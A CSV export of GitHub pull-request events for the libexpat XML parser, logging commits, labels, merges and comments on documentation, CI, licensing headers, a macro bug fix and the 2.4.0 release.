469,SubmitCommit,2021-04-25 17:11:14,hartwork,unfork_merge,"xmlwf.1: Drop section ""alternatives"" that contains only dead links","{""sha"": ""506600c59f0d7b24f13c9e3d0ccb0ce236525b6b"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-25T16:45:42Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-25T17:11:14Z""}}"
469,SubmitCommit,2021-04-25 17:11:14,hartwork,unfork_merge,"xmlwf.1: Improve links in section ""see also""","{""sha"": ""a1c3ac908c355fae5d89b0ab4638c6b0cc4fa238"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-25T16:49:49Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-25T17:11:14Z""}}"
469,SubmitCommit,2021-04-25 17:11:14,hartwork,unfork_merge,xmlwf.1: Use <command>&dhpackage;</command> where missing,"{""sha"": ""de34e8ce156990999f4bf81677e8fc7c4be66b77"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-25T16:44:57Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-25T17:11:14Z""}}"
469,SubmitCommit,2021-04-25 17:11:14,hartwork,unfork_merge,"xmlwf.1: Be more precise in section ""author""","{""sha"": ""dd77046dc3043af0a604e79cbc0ee29115effab5"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-25T17:07:59Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-25T17:11:14Z""}}"
469,SubmitCommit,2021-04-25 17:11:14,hartwork,unfork_merge,xmlwf.1: Bump date of last modification,"{""sha"": ""1f75b7fbac19962f20d5401d300e34d440656996"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-25T16:59:10Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-25T17:11:14Z""}}"
469,SubmitCommit,2021-04-25 17:13:00,hartwork,unfork_merge,Changes: Document improvements to the man page,"{""sha"": ""1a5ae0e4c093c57899a43012ca0ad6d912e34cdc"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-25T17:13:00Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-25T17:13:00Z""}}"
469,Labeled,2021-04-25 17:14:47,hartwork,unfork_merge,enhancement,
469,OpenPR,2021-04-25 17:14:47,hartwork,unfork_merge,,
469,MergePR,2021-04-25 18:30:09,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4641490444"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/444af3db2380f11a902b379fb49a5ab025097f1c""}"
469,DeleteBranch,2021-04-25 19:54:27,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4641574649"", ""commit_url"": null}"
470,SubmitCommit,2021-04-25 20:51:23,hartwork,unfork_merge,"Revert ""runtests.c: Workaround issue with combining XML_MIN_SIZE and ASan (#332)""

This reverts commit 48d4929bffdd60c88b913b58365062c92b789363.","{""sha"": ""72cdab2aebfb321e8127aadef57421206af78389"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-21T13:40:06Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-25T20:51:23Z""}}"
470,SubmitCommit,2021-04-25 20:51:23,hartwork,unfork_merge,"Revert ""runtests.c: Fix compiler warning ""unused function"" with -DEXPAT_MIN_SIZE=ON""

This reverts commit 76f2beee810aa0a6bee3fe63e33fa170961e565d.","{""sha"": ""841338da7ff8168ce57355809c79a0dbc9cf9f3f"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-21T13:41:31Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-25T20:51:23Z""}}"
470,OpenPR,2021-04-26 12:17:13,hartwork,unfork_merge,,
470,Labeled,2021-04-26 12:17:14,hartwork,unfork_merge,bug,
470,Revise,2021-04-26 12:18:00,hartwork,unfork_merge,lib: Add comments about effect of XML_MIN_SIZE to xmltok_impl.c,"{""sha"": ""3b1b81f0284feb9e02387680e31293c363221161"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-26T12:11:53Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-26T12:18:00Z""}}"
470,Revise,2021-04-26 12:18:00,hartwork,unfork_merge,"lib: Fix macro IS_INVALID_CHAR (for UTF-16 with macro XML_MIN_SIZE defined)

What happens is that with macro XML_MIN_SIZE defined,
for UTF-16 macro IS_INVALID_CHAR was being set to ..

> #define IS_INVALID_CHAR(enc, p, n)  (AS_NORMAL_ENCODING(enc)->isInvalid##n(enc, p))

.. which calls NULL pointers in .isInvalid{2,3,4} at runtime.

For UTF-16 we actually need what xmltok_impl.c does for macro
IS_INVALID_CHAR when it has not yet been defined:

> #  ifndef IS_INVALID_CHAR
> #    define IS_INVALID_CHAR(enc, ptr, n) (0)
> #  endif

So the fix is a combination of these two:
- Use .isInvalid{2,3,4} where needed and available and
- return 0/false for UTF-16 where .isInvalid{2,3,4} are NULL.","{""sha"": ""ed36812db2017e8a68eb7825ecd8dd2bc89cd2e5"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-24T19:13:24Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-26T12:18:00Z""}}"
470,MergePR,2021-04-30 03:25:17,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4666655062"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/af6bb52c7d8950b26da97caa03e1b81907727e04""}"
470,DeleteBranch,2021-04-30 03:25:48,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4666656492"", ""commit_url"": null}"
472,SubmitCommit,2021-05-01 22:50:54,hartwork,unfork_merge,conftools: Delete unused legacy helper PrintPath,"{""sha"": ""ec3186f7ac970459d1f7a22929c51516a6a26927"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-01T22:50:54Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-01T22:50:54Z""}}"
472,Labeled,2021-05-01 23:03:43,hartwork,unfork_merge,enhancement,
472,OpenPR,2021-05-01 23:03:43,hartwork,unfork_merge,,
472,MergePR,2021-05-01 23:52:47,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4674155236"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/6050ed062eb354870201922bdf0367e622553635""}"
472,DeleteBranch,2021-05-02 17:53:21,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4675073901"", ""commit_url"": null}"
473,SubmitCommit,2021-05-02 17:53:29,hartwork,unfork_merge,.mailmap: Initialize Git mailmap,"{""sha"": ""1f0b77316b0dfd4974901ebda768cf3a6338a775"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-02T03:28:37Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-02T17:53:29Z""}}"
473,SubmitCommit,2021-05-02 17:53:29,hartwork,unfork_merge,Pump up oneline MIT headers to full ones,"{""sha"": ""bb3cf96dbe763149f7ad55b53eadcdebd5811095"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-01T21:30:12Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-02T17:53:29Z""}}"
473,SubmitCommit,2021-05-02 17:53:29,hartwork,unfork_merge,Add missing MIT headers,"{""sha"": ""8c6f0369db15dcb2f1500837a0c4d3347146bea4"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-01T21:52:13Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-02T17:53:29Z""}}"
473,SubmitCommit,2021-05-02 17:53:29,hartwork,unfork_merge,Increase precision in existing MIT headers based on Git history,"{""sha"": ""df42f935bfe9703594ad2c411f35d9948ebd7281"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-01T23:49:02Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-02T17:53:29Z""}}"
473,Labeled,2021-05-02 18:36:01,hartwork,unfork_merge,enhancement,
473,OpenPR,2021-05-02 18:36:01,hartwork,unfork_merge,,
473,MergePR,2021-05-02 21:52:01,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4675302360"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/7f7da50d9c7013af6462953c0785253b17051027""}"
473,DeleteBranch,2021-05-02 21:52:26,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4675302715"", ""commit_url"": null}"
473,CrossReferenced,2021-05-13 20:48:30,hartwork,unfork_merge,Improve attribution,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/483"", ""is_pull_request"": true}}"
474,Labeled,2021-05-02 18:42:46,hartwork,unfork_merge,enhancement,
474,OpenPR,2021-05-02 18:42:46,hartwork,unfork_merge,,
474,Revise,2021-05-02 18:49:51,hartwork,unfork_merge,Actions: Isolate somewhat flaky coverage task,"{""sha"": ""4a7b1d5dcf91c95d472f4ebb73291d7785edd626"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-02T18:39:40Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-02T18:49:51Z""}}"
474,MergePR,2021-05-02 20:40:39,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4675238179"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/7820e4137fe4d9e205d73b442abcb3963db5246b""}"
474,DeleteBranch,2021-05-02 21:52:25,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4675302710"", ""commit_url"": null}"
475,SubmitCommit,2021-05-04 19:14:53,hartwork,unfork_merge,"doc/reference.html: Always start uppercase after ""Note: ""","{""sha"": ""988bff10cdfa7e7cdbad5b6c0f3dff5a68abc660"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-04T19:07:59Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-04T19:14:53Z""}}"
475,SubmitCommit,2021-05-04 19:14:53,hartwork,unfork_merge,"doc/reference.html: Add missing space after ""Note:""","{""sha"": ""f5dd8a9a5a2c80b0f970c832d5cacf356d214775"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-04T19:08:29Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-04T19:14:53Z""}}"
475,SubmitCommit,2021-05-04 19:14:53,hartwork,unfork_merge,doc/reference.html: Fix latest release version,"{""sha"": ""888566e418ac95d80af40d8a8e1cf54b44b4fba7"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-04T18:52:05Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-04T19:14:53Z""}}"
475,OpenPR,2021-05-04 19:32:25,hartwork,unfork_merge,,
475,RenameTitle,2021-05-04 19:36:52,hartwork,unfork_merge,,"{""rename"": {""from"": ""[W.I.P.] Restyle doc/reference.html using a classless/no-class CSS kit to look less like the 90s"", ""to"": ""[W.I.P.] Restyle doc/reference.html to look less like the 90s (based on a classless CSS kit to save cost)""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4685291444""}"
475,Labeled,2021-05-04 19:37:15,hartwork,unfork_merge,enhancement,
475,RenameTitle,2021-05-04 19:59:37,hartwork,unfork_merge,,"{""rename"": {""from"": ""[W.I.P.] Restyle doc/reference.html to look less like the 90s (based on a classless CSS kit to save cost)"", ""to"": ""Quickly restyle doc/reference.html to look a bit less like the 90s (based on a classless CSS kit)""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4685386956""}"
475,Revise,2021-05-04 21:49:00,hartwork,unfork_merge,"doc/reference.html: Migrate to OK.css

Precisely this version:
https://github.com/andrewh0/okcss/blob/ab0e43d64bf76b1734e1f8ab9d46b7c4378ebb8c/dist/ok.min.css","{""sha"": ""3596977d9da1297ff562cef669cb464f7becb39e"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-04T19:53:00Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-04T21:49:00Z""}}"
475,Revise,2021-05-04 21:49:03,hartwork,unfork_merge,doc/reference.html: Simplify header,"{""sha"": ""e13d94b426445cd5598860245a8cc83bed794020"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-04T18:57:37Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-04T21:49:03Z""}}"
475,Revise,2021-05-04 21:49:03,hartwork,unfork_merge,"doc/reference.html: Replace footer, encourage bug reports","{""sha"": ""30c4aa85f530f279d8c9cc2f584fa9a9df7e2bf1"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-04T19:55:09Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-04T21:49:03Z""}}"
475,Revise,2021-05-04 21:49:05,hartwork,unfork_merge,doc/reference.html: Introduce <h4> headings for API functions,"{""sha"": ""6f47cee76029ca07926c08e2a22c48a3f5978211"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-04T21:43:22Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-04T21:49:05Z""}}"
475,MergePR,2021-05-04 23:24:11,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4686134815"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/7938b88c9b9a534bd7f0aac7ac4f2e270f0c1b68""}"
475,DeleteBranch,2021-05-04 23:24:34,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4686135789"", ""commit_url"": null}"
475,CrossReferenced,2021-05-05 16:21:07,hartwork,unfork_merge,Description list (dl/dt/dd) spacing bug + general (mostly delighted) feedback :),"{""reference"": {""url"": ""https://api.github.com/repos/andrewh0/okcss/issues/4"", ""is_pull_request"": false}}"
475,CrossReferenced,2021-05-07 15:12:11,hartwork,unfork_merge,Make CI ensure well-formed and valid XML in our XML-based documentation,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/477"", ""is_pull_request"": true}}"
476,SubmitCommit,2021-05-07 13:10:37,hartwork,unfork_merge,.github/workflows/coverage.yml: Fix broken task name,"{""sha"": ""1a01ba37f065e3e6f995bb56cdbb90bdc04fb2e6"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T13:07:55Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T13:10:37Z""}}"
476,SubmitCommit,2021-05-07 13:12:06,hartwork,unfork_merge,".github/workflows: Re-add repo ppa:ondrej/php(!) to fix wine32 installation

Related:
https://github.com/actions/virtual-environments/issues/3339","{""sha"": ""fe29a25ec008c610faf5fcf47cee3c48fe789ba3"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T12:45:05Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T13:12:06Z""}}"
476,OpenPR,2021-05-07 13:22:05,hartwork,unfork_merge,,
476,MergePR,2021-05-07 13:56:32,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4702129781"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/8d28fe29be412b216b5c57e1de9e5dceaefebb64""}"
476,DeleteBranch,2021-05-07 13:56:59,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4702133330"", ""commit_url"": null}"
476,CrossReferenced,2021-05-13 15:02:57,hartwork,unfork_merge,Actions: Drop/revert explicit addition of repository ppa:ondrej/php,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/482"", ""is_pull_request"": true}}"
477,OpenPR,2021-05-07 15:03:54,hartwork,unfork_merge,,
477,Revise,2021-05-07 15:04:06,hartwork,unfork_merge,"xmlwf.1: Add public external DocBook identifier to doctype

.. so that we can throw validation tools at it.","{""sha"": ""edf095116c6ac8a229f1b778fda17b49114c1766"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T14:30:30Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T15:04:06Z""}}"
477,Revise,2021-05-07 15:04:06,hartwork,unfork_merge,xmlwf.1: Fix DocBook validity,"{""sha"": ""283f024a4e2557f012604ecde7d87ead8b93c565"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T14:39:47Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T15:04:06Z""}}"
477,Revise,2021-05-07 15:04:06,hartwork,unfork_merge,doc/reference.html: Fix XML validity,"{""sha"": ""55dbc442000a1ff609d82201c8cb062c06bca12f"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T15:00:07Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T15:04:06Z""}}"
477,Revise,2021-05-07 15:04:06,hartwork,unfork_merge,Actions: Ensure well-formed and valid XML,"{""sha"": ""e43dab0c4400362e94b92ab5b28472c06d14cc3d"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T14:30:12Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T15:04:06Z""}}"
477,Labeled,2021-05-07 15:08:35,hartwork,unfork_merge,enhancement,
477,Labeled,2021-05-07 15:18:58,hartwork,unfork_merge,bug,
477,MergePR,2021-05-07 16:24:26,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4703206276"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/9d425466b89c807e6a04d0f9b3a3876b7fd30f95""}"
477,DeleteBranch,2021-05-07 16:25:02,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4703210055"", ""commit_url"": null}"
478,SubmitCommit,2021-05-08 20:14:06,hartwork,unfork_merge,doc/reference.html: Upgrade to OK.css 1.0.3,"{""sha"": ""99bf4c370f9dd674dc61dc3803a0a36efcb561ef"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-08T19:48:31Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-08T20:14:06Z""}}"
478,OpenPR,2021-05-08 20:16:30,hartwork,unfork_merge,,
478,MergePR,2021-05-08 21:47:46,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4708935047"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/fb78bfdae55408af50eb0da558f288775fd92baf""}"
478,DeleteBranch,2021-05-08 22:23:34,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4709018169"", ""commit_url"": null}"
480,Labeled,2021-05-11 14:34:27,hartwork,unfork_merge,releasing,
480,OpenPR,2021-05-11 14:34:27,hartwork,unfork_merge,,
480,Revise,2021-05-22 17:07:49,hartwork,unfork_merge,README.md: Make CMake config mode example more clear,"{""sha"": ""100bc7072ca63a9053b4e34b80d084896cfb143e"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-22T13:29:58Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-22T17:07:49Z""}}"
480,Revise,2021-05-22 17:07:49,hartwork,unfork_merge,README.md: Document where generated CMake files need >=2.4.0 to work,"{""sha"": ""a7694ee392110674eddaf9eb819eb7dda12ce56f"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-22T13:31:07Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-22T17:07:49Z""}}"
480,Revise,2021-05-22 17:07:49,hartwork,unfork_merge,README.md: Fix a URL for some markdown interpreters,"{""sha"": ""39e081acc0edf211baf2dcfe6c85d2b5f821342c"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-22T13:35:36Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-22T17:07:49Z""}}"
480,Revise,2021-05-22 17:07:49,hartwork,unfork_merge,README.md: Mention Windos binaries zip download option,"{""sha"": ""fb952cb1d69689865e2ea0f210e11f72ab2d5038"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-22T13:41:12Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-22T17:07:49Z""}}"
480,Revise,2021-05-22 17:07:49,hartwork,unfork_merge,Changes: Combine notes on billion laughs attack protection,"{""sha"": ""c57141d59751c71ff9559cdf64fefea9dc50f0df"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-21T15:19:33Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-22T17:07:49Z""}}"
480,Revise,2021-05-22 17:07:49,hartwork,unfork_merge,Changes: Document new XML_FEATURE_ constants,"{""sha"": ""731bdee05388c714c4a5d2eb4b2afc499e74727d"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-21T15:25:59Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-22T17:07:49Z""}}"
480,Revise,2021-05-22 17:07:49,hartwork,unfork_merge,Changes: Extend section on upcoming release 2.4.0,"{""sha"": ""bc6495dfc0ce36277d36c231f794b10e5ed4e609"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-11T13:46:42Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-22T17:07:49Z""}}"
480,Revise,2021-05-22 17:07:49,hartwork,unfork_merge,Bump version to 2.4.0,"{""sha"": ""b913a529ae090647c015d4212048b58ebae93aeb"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-11T13:55:19Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-22T17:07:49Z""}}"
480,Revise,2021-05-22 17:07:49,hartwork,unfork_merge,"Bump version info from 8:0:7 to 9:0:8

See https://verbump.de/ for what these numbers do","{""sha"": ""e083f03235c5e86a4a4f9b7e233db5cf47cd4b54"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-11T14:00:52Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-22T17:07:49Z""}}"
480,Revise,2021-05-22 17:42:02,hartwork,unfork_merge,Set expected release date for 2.4.0,"{""sha"": ""ecdff1c906ecb041c0c05a27410211b1052f7ab1"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-11T14:03:19Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-22T17:42:02Z""}}"
480,MergePR,2021-05-22 22:26:06,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4782760461"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/ac2b235d3cea96ed105bbfc0052ae9b79e8ccb78""}"
480,DeleteBranch,2021-05-22 22:26:50,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4782760833"", ""commit_url"": null}"
481,SubmitCommit,2021-05-12 11:59:35,hartwork,unfork_merge,"CMake: Support standard variable BUILD_SHARED_LIBS

https://cmake.org/cmake/help/latest/variable/BUILD_SHARED_LIBS.html","{""sha"": ""9cc3ca3e361551e9e5f7c2083e9a744d58f5f437"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-12T11:58:51Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-12T11:59:35Z""}}"
481,Labeled,2021-05-12 12:04:04,hartwork,unfork_merge,enhancement,
481,Labeled,2021-05-12 12:04:04,hartwork,unfork_merge,compilation,
481,OpenPR,2021-05-12 12:04:04,hartwork,unfork_merge,,
481,Revise,2021-05-12 13:05:25,hartwork,unfork_merge,Changes: Document support for CMake variable BUILD_SHARED_LIBS,"{""sha"": ""7e080292711c61b901c66af8d2a76fe259c6cd59"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-12T12:00:57Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-12T13:05:25Z""}}"
481,IssueComment,2021-05-12 14:21:42,1480c1,unfork_merge,Seems good to me,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/839813338"", ""author_association"": ""NONE""}"
481,IssueComment,2021-05-13 12:07:55,hartwork,unfork_merge,@concatime good to merge?,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/840513465"", ""author_association"": ""MEMBER""}"
481,IssueComment,2021-05-13 15:48:27,concatime,unfork_merge,"Yes, thank you!","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/840651478"", ""author_association"": ""NONE""}"
481,IssueComment,2021-05-13 16:33:10,hartwork,unfork_merge,"Excellent, thanks to the two of you! :pray: ","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/840679033"", ""author_association"": ""MEMBER""}"
481,MergePR,2021-05-13 16:33:27,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4742787396"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/31bce2cc813ed63bb7ba45cd97f1a5586b817188""}"
481,DeleteBranch,2021-05-13 16:34:10,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4742790300"", ""commit_url"": null}"
482,SubmitCommit,2021-05-13 14:55:31,hartwork,unfork_merge,"Revert "".github/workflows: Re-add repo ppa:ondrej/php(!) to fix wine32 installation""

This reverts commit fe29a25ec008c610faf5fcf47cee3c48fe789ba3.

Related:
https://github.com/actions/virtual-environments/issues/3339","{""sha"": ""b3a988a3cef38a2bea7f6141fb4da58a9df823e6"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-13T14:26:08Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-13T14:55:31Z""}}"
482,OpenPR,2021-05-13 14:57:27,hartwork,unfork_merge,,
